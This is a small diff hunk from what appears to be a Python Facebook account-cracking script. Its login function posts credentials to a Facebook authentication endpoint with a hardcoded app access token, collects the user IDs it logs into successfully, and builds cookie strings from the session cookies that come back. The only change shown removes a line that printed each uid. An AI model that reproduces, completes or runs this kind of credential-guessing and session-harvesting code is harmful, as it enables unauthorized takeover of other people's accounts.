@@ -188,7 +188,7 @@ def login(uid, meth):
                           ".headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728"
                           "|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true",
                 headers=headers).json()
-            print(uid)
+            
             if "session_key" in rp:
                 oks.append(uid)
                 coki = ";".join(i["name"] + "=" + i["value"] for i in rp["session_cookies"])
